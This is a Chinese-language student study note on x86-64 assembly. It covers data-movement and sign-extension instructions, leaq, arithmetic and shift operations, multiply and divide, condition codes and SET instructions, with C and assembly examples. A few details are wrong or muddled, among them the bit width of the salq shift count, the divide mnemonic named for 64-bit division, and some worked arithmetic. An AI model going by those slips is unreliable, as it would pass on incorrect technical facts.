align="center">将做了符号扩展的字节传送到双字</td></tr><tr><td align="center">movswl</td><td align="center">将做了符号扩展的字传送到双字</td></tr><tr><td align="center">movsbq</td><td align="center">将做了符号扩展的字节传送到四字</td></tr><tr><td align="center">movswq</td><td align="center">将做了符号扩展的字传送绝对四字</td></tr><tr><td align="center">movslq</td><td align="center">将做了符号扩展的双字传送到四字</td></tr><tr><td align="center">cltq</td><td align="center">把%eax符号扩展到%rax</td></tr></tbody></table><p><strong>注意：cltq指令只能作用于寄存器%eax和%rax</strong><br>数据传输的例子：</p><ol><li>第一个例子</li></ol><pre class=" language-x86asm"><code class="language-x86asm">movabsq $0x0011223344556677, %rax   # %rax = 0x0011223344556677movb    $-1, %al                    # %rax = 0x00112233445566FFmovw    $-1, %ax                    # %rax = 0x001122334455FFFFmovl    $-1, %eax                   # %rax = 0x00000000FFFFFFFFmovq    $-1, %rax                   # %rax = 0xFFFFFFFFFFFFFFFF</code></pre><p>2.第二个例子</p><pre class=" language-x86asm"><code class="language-x86asm">movabsq $0x0011223344556677, %rax   # %rax = 0x0011223344556677movb    $0xAA, %dl                  # %dl  = 0xAAmovb %dl, %al                       # %rax = 0x00112233445566AAmovsbq %dl, %rax                    # %rax = 0xFFFFFFFFFFFFFFAAmovzbq %dl, %rax                    # %rax = 0x00000000000000AA</code></pre><h2 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h2><ul><li>push src：把数据压入栈中</li><li>pop dst：抽出栈顶数据</li></ul><p><strong>注意：</strong> 以上操作是通过寄存器%rsp中所存地址指向栈顶。抽出栈顶数据后，原来的数据保持在原来的内存位置中，直到被覆盖。<br>这里的相关内容还没细讲，以后再补吧。</p><h2 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h2><p><font color="#DC143C">leaq指令：</font> leaq Src, Dst：直接将有效地址（即：把<font color="#FF8C00">括号内的值</font>，不读入对应内存的数据）写入到目的。<br><strong>leaq可以简洁地描述普通的算术操作</strong><br>例如：</p><pre class=" language-x86asm"><code class="language-x86asm">leaq 7(%rdi, %rsi, 4), %rax         # 设%rdi总存数据x，%rsi中存数据y，则这条指令是将 x+4y+7 存入%rax中</code></pre><h2 id="其他算术和逻辑操作"><a href="#其他算术和逻辑操作" class="headerlink" title="其他算术和逻辑操作"></a>其他算术和逻辑操作</h2><p>这里先简单的给出这些操作：</p><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>inc D</td><td>D = D + 1</td></tr><tr><td>dec D</td><td>D = D - 1</td></tr><tr><td>neg D</td><td>D = -D</td></tr><tr><td>not D</td><td>D = ~D</td></tr><tr><td>add S,D</td><td>D = D + S</td></tr><tr><td>sub S,D</td><td>D = D - S</td></tr><tr><td>imul S,D</td><td>D = D * S</td></tr><tr><td>xor S,D</td><td>D = D ^ S</td></tr><tr><td>or S,D</td><td>D = D &#124; S</td></tr><tr><td>and S,D</td><td>D = D &amp; S</td></tr><tr><td>sal k,D</td><td>D = D &lt;&lt; k</td></tr><tr><td>shl k,D</td><td>D = D &lt;&lt; k</td></tr><tr><td>sar k,D</td><td>D = D &gt;&gt;<sub>算术</sub>k</td></tr><tr><td>shr k,D</td><td>D = D &gt;&gt;<sub>逻辑</sub>k</td></tr></tbody></table><p>(注意到sal和shl是一样的，因为左移不会涉及符号位)</p><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p>移位操作对w位长的数据值进行操作，移位量是有%cl寄存器的低m位决定的，这里2<sup>m</sup>=w，剩余高位会被忽略。<br><strong>所以，例如当寄存器%cl是十六进制值为0xFF(11111111)时，指令salb会移7位(111，二进制3位)，salw会移15位(1111，二进制4位)，sall会移31位(11111，二进制5位)，salq会移63位(111111，二进制5位)。</strong> 这些位数也是对应指令能移动的最高位数。</p><p>这里来举个例子：一个32位的int数1，移动n=34位，计算1&lt;&lt;n，因为(34)<sub>10</sub>=(100010)<sub>2</sub> 取前五位00010，即2。所以1&lt;&lt;34等价于1&lt;&lt;2=4。其实就是让n mod 32(2<sup>m</sup>)。</p><p>所以习题3.60中</p><pre class=" language-x86asm"><code class="language-x86asm">salq %cl, %rdx          # %ecx中的值为n，%rdx中的值是mask</code></pre><p>所以这条语句的作用是 <code>mask = mask &lt;&lt; n</code>，并不用截取%rcx的前八位<del>(n &amp; 0xFF)</del>，直接移动n为即可，因为salq最多移63位(11111)，n太大了也会被截成64以下（只取n二进制下的前6位）。</p><h3 id="特殊算术操作"><a href="#特殊算术操作" class="headerlink" title="特殊算术操作"></a>特殊算术操作</h3><ul><li>1.一个操作数<br>从上面的表我们可以看到，乘（mul和imul）和除（div和idiv）都是二元操作。这样的操作是在同位数数据采用的，比如：如果你用<br><code>imulq S,D</code>指令，则代表你计算的内容是一个64位数乘一个64位数并得到一个64位数。我们在前面的学习中便知道，w位数乘w位数会先得到一个2w位数，然后再截取前w位得到最后的结果。但如果你想得到就是那个2w位数，以w=64位例，计算机会将其处理未这样的汇编指令：<code>imulq S</code>。这条指令的效果是：R[%rdx]:R[%rax]&lt;–S/<em>R[%rax]，即把S中的数与%rax中的数做补码乘法后，*</em>将乘积的高64位存在%rdx中，低64位存在%rax中。** 当操作为无符号操作<code>mulq S</code>时同理。<br>这里有一个两个无符号64位数乘法得到无符号128位数的例子：<br>C语言代码为：</li></ul><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">store_uprod</span><span class="token punctuation">(</span>uint128_t <span class="token operator">*</span>dest<span class="token punctuation">,</span> uint64_t x<span class="token punctuation">,</span> uint64_t y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">*</span>dest <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>uint128_t<span class="token punctuation">)</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>他的汇编代码为：</p><pre class=" language-x86asm"><code class="language-x86asm">store_uprod:    movq %rsi, %rax                     mulq %rdx    movq %rax, (%rdi)    movq %rdx, 8(%rdi)              # 小端机器    ret</code></pre><p>以64位为例，对于除法<code>idivl S</code>，他会把R[%rdx]:R[%rax]作为<strong>被除数</strong>（128位），S为除数，将结果的商存在%rax中，余存在%rdx中。如果被除数是64位，则%rdx中全为0（无符号位）或全为%rax的符号位（有符号运算），这两个操作可以用<code>cqto</code>（R[%rdx]:R[%rax]&lt;–R[%rax]完成。</p><p>对于64位以下的操作mulb / mulw / mull，一元乘除操作也是同理，<strong>另一个源操作数会隐含在R[%al] / R[%ax] / R[%eax]中，结果存在R[%ax] / R[%dx]:R[%ax] / R[%edx]:R[%eax]中</strong>，除法同理。<br>还需要注意一点的是有符号乘法，若要取2w位应该采用“布斯乘法”，也就是习题2.75让我们推导的计算两个w位补码运算结果的高w位（一共2w位）的方法：(x, y表示有符号数，x’,y’表示与其二进制表示相同的无符号数)</p><blockquote><p> (x’ * y’)<sub>高w位</sub> = (x * y)<sub>高w位</sub> + x * y的符号位 + y * x的符号位</p></blockquote><p>此公式的推导思路源于教材公式2.18。<br>例子：<br>无符号数0xB4 (180) 乘 无符号数0x11 (17) 结果为0xBF4 (3060)。<br>有符号数0xB4(-76) 乘 有符号数0x11 (17) 结果为0xFAF4 (-1292) ，并非<del>(0xBF4)</del>。(0xB=(0xFA+0x11) mod 64)</p><ul><li>2.三个操作数<br>指令： MUL Imm, Src, Reg<br>功能：将Src和立即数Imm相乘，结果存在Reg中。<br>例子：R[%eax] = 0xB4, R[%ebx] = 0x11, M[0xF8] = 0xA0，执行指令<code>imull $-16, (%eax, %ebx, 4), %eax</code>的效果：<br>R[%eax]&lt;– (-16) x M[R[%eax] + R[%ebx] x 4] = (-16) x M[0xB4 + 0x11 &lt;&lt; 2] = (-16) x M[0xF8] = (-16) x 0xA0 = 0xFFFFFF60 &lt;&lt; 4（做一个补码操作去除负号）= 0xFFFFF600 = -2560</li></ul><h3 id="整数乘除指令总结"><a href="#整数乘除指令总结" class="headerlink" title="整数乘除指令总结"></a>整数乘除指令总结</h3><ul><li>乘法<ul><li>一个操作数<br>若给出一个操作数Src，则另一个源操作数隐含在R[%al] / R[%ax] / R[%eax]中，将Src和前述寄存器（累加器accumulate）中内容相乘，结果存放在R[%ax]（16位）/ R[%dx]:R[%ax]（32位）/ R[%edx]:R[%eax]（64位）中。</li><li>两个操作数<br>MUL Src, Dst : Dst&lt;–Dst MUL Src</li><li>三个操作数<br>MUL Imm, Src, Reg : Reg&lt;–Imm MUL Src</li></ul></li><li>除法<ul><li>除数为8位，则16位被除数在R[%ax]中，商送回R[%al]，余数在R[%ah]</li><li>除数为16位，则32位被除数在R[%dx]:R[%ax]中，商送回R[%ax]，余数在R[%dx]</li><li>除数为32位，则64位被除数在R[%edx]:R[%eax]中，商送回R[%eax]，余数在R[%edx] </li><li>除数为64位，则128位被除数在R[%rdx]:R[%rax]中，商送回R[%rax]，余数在R[%rdx]</li></ul></li></ul><h2 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h2><p>在下面介绍</p><h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><p>输入输出指令(IN, OUT)和标志传送指令(PUSHF, POPF)等还没细讲，以后再补。</p><hr><h1 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h1><h2 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h2><p>除了整数寄存器，CPU还维护着一组<strong>单个位</strong>的条件码寄存器，他们描述了<strong>最近</strong>的算术或逻辑操作的属性。可以检测这些寄存器来执行条<strong>条件分支指令</strong>。<br>最常用的条件码有：</p><ul><li><strong>CF</strong>：进位标志。最近的操作使最高位产生了进位（加分有进位（carry），减法有借位（borrow））。可以用来检查<strong>无符号</strong>操作的溢出。</li><li><strong>ZF</strong>：零标志。最近的操作得出结果为0。（所有位上数字都是0）</li><li><strong>SF</strong>：符号标志。最近的操作得到的结果为负数。</li><li><strong>OF</strong>：溢出标志。最近的操作导致一个补码溢出——正溢出或负溢出。(如y……+y……=z……，或y…….-z……=z…… 「其中z=~y」等)</li></ul><h2 id="定点算术运算和逻辑运算对条件码的影响"><a href="#定点算术运算和逻辑运算对条件码的影响" class="headerlink" title="定点算术运算和逻辑运算对条件码的影响"></a>定点算术运算和逻辑运算对条件码的影响</h2><ul><li>ADD：影响OF, ZF, SF, CF。</li><li>SUB：影响OF, ZF, SF, CF。有借位，即减数&gt;被减数，则CF=1。两个数符号相反但结果符号与减数相同，则OF=1</li><li>INC：影响OF, ZF, SF。<strong>注意：不会影响CF</strong>，也就是说不会产生进位信息</li><li>DEC：影响OF, ZF, SF。<strong>注意：同INC</strong></li><li>NEG：影响OF, ZF, SF,  CF。相当于用0减操作数或者取反+1，OF变化同减法（所以只有当操作数为100…0时，OF才会变为1）</li><li>CMP：影响OF, ZF, SF, CF。</li><li>MUL：只影响OF, CF。乘积高一半为0，则CF=OF=0，否则是1。</li><li>IMUL：只影响OF, CF。乘积高一半为低一半的符号扩展，则CF=OF=0，否则是1。</li><li>DIV, IDIV：不影响上述条件码。</li><li>AND, OR, XOR, TEST：<strong>都会使OF和CF变为0</strong>，ZF和SF根据结果设置。</li><li><strong>NOT：不影响标志</strong></li><li>SHL, SHR, SAL, SAR, ROL, ROR：CF=移入的数值，ZF和SF根据结果设置，如果最高位变化，则OF=1，否则为0。</li></ul><p><a href="http://abcdxyzk.github.io/blog/2012/12/20/assembly-cmd-flags/" target="_blank" rel="noopener">参考链接</a></p><p>例子：R[%ax]=0xFFFA, R[%bx]=0xFFF0，执行指令（Intel格式）<code>add ax bx</code>：<br>R[%ax]&lt;–R[%ax] + R[%bx] = 0xFFFA + 0xFFF0 = 0xFFEA, R[%bx]中内容不变，CF = 1, OF = 0, ZF = 0, SF = 1。<br>对于上述例子，<strong>若是无符号整数运算，则CF=1说明结果溢出。若是有符号整数运算，OF=0说明结果没有溢出。</strong></p><h2 id="比较和控制指令"><a href="#比较和控制指令" class="headerlink" title="比较和控制指令"></a>比较和控制指令</h2><p><strong>这两种指令不修改任何寄存器的值，只设置条件码</strong></p><ul><li><ol><li>CMP (cmpb, cmpw, cmpl, cmpq)<br>CMP S1, S2：就是计算<strong>S2 - S1</strong>，以设置条件码得以看出比较的结果。<ul><li>CF = 1: 发生了进位或借位（这里做减法一般是借位，借位了就表明S2 &lt; S1）</li><li>ZF = 1: S1 = S2</li><li>SF = 1: S2 - S1 &lt; 0（补码运算意义上的）</li><li>OF = 1: (a &gt; 0 &amp;&amp; b &lt; 0 &amp;&amp; (a - b) &lt; 0) || (a &lt; 0 &amp;&amp; b &gt; 0 &amp;&amp; (a - b) &gt; 0)</li></ul></li></ol></li><li><ol start="2"><li>TEST (testb, testw, testl, testq)<br>TEST S1, S2：就是计算<strong>S1 &amp; S2</strong>，以设置条件码。<ul><li>ZF = 1: S1 &amp; S2 = 0</li><li>SF = 1: S1 &amp; S2 &lt; 0（补码运算意义上的）<br>经常使用这个指令测试一个数是不是负数：<code>testq %rax, %rax</code></li></ul></li></ol></li></ul><h2 id="设置指令"><a href="#设置指令" class="headerlink" title="设置指令"></a>设置指令</h2><p>SET类的指令可以将一个字节的值设置为条件码的某种组合，这种指令的目的操作数是<strong>低位单字节寄存器之一或一个字节的内存位置</strong>（如%al），一般是配合比较和测试指令使用，下面列出常用的SET类指令：</p><table><thead><tr><th>指令</th><th>同义名</th><th>效果</th><th>设置条件</th></tr></thead><tbody><tr><td>sete D</td><td>setz</td><td>D &lt;– ZF</td><td>相等/零</td></tr><tr><td>setne D</td><td>setnz</td><td>D &lt;– ~ZF</td><td>不等/非零</td></tr><tr><td>sets D</td><td></td><td>D &lt;– SF</td><td>负数</td></tr><tr><td>setns D</td><td></td><td>D &lt;– ~SF</td><td>非负数</td></tr><tr><td>setg D</td><td>setnle</td><td>D &lt;– ~(SF ^ OF) &amp; ~ZF</td><td>有符号&gt; (greater)</td></tr><tr><td>setge D</td><td>setnl</td><td>D &lt;– ~(SF ^ OF)</td><td>有符号 &gt;=</td></tr><tr><td>setl D</td><td>setnge</td><td>D &lt;– SF ^ OF</td><td>有符号&lt;</td></tr><tr><td>setle D</td><td>setng</td><td>D &lt;– (SF ^ OF) &#124; ZF</td><td>有符号&lt;=</td></tr><tr><td>seta D</td><td>setnbe</td><td>D &lt;– ~CF &amp; ~ZF</td><td>无符号&gt; (above)</td></tr><tr><td>setae D</td><td>setnb</td><td>D &lt;– ~CF</td><td>无符号&gt;=</td></tr><tr><td>setb D</td><td>setnae</td><td>D &lt;– CF</td><td>无符号&lt; (below)</td></tr><tr><td>setbe D</td><td>setna</td><td>D &lt;– CF &#124; ZF</td><td>无符号&lt;=</td></tr></tbody></table><p>下面是一个例子：<br>设C函数：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x <span class="token operator">></span> y<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其汇编代码为：</p><pre class=" language-x86asm"><code class="language-x86asm">compare:                        # x in %rdi, y in %rsi    cmpq %rsi, %rdi             # compute x - y    setg %al                    # 大于则设置为1，否则为0    movzbl %al, %eax            # 这项操作是使 %eax(and %rax) 上其他位的数据全部清空为0，保证返回数据只为%al上的数据    ret</code></pre><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><p>等讲了再补</p><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 课程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
